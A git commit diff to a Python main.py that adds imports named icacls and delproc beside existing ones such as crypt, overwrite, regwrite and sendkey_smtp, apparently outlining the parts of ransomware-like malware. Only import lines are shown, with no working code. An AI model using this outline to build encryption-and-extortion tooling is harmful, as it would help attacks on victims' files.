3c74e86c70f418adb5f415f222c0aa6f106fffe0
LafondMael <71012200+LafondMael@users.noreply.github.com>
2021-10-29 03:18:48 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,8 +1,8 @@
 #!/usr/bin/python
 #coding:utf-8
 from modules.crypt import crypt
-from modules.admin import overwrite, admin_right
-from modules.system import  regwrite
+from modules.admin import overwrite, icacls, admin_right
+from modules.system import  delproc, regwrite
 from modules.network import host_connect, sendkey_smtp, keyserver
 import os, sys, ctypes, time
 
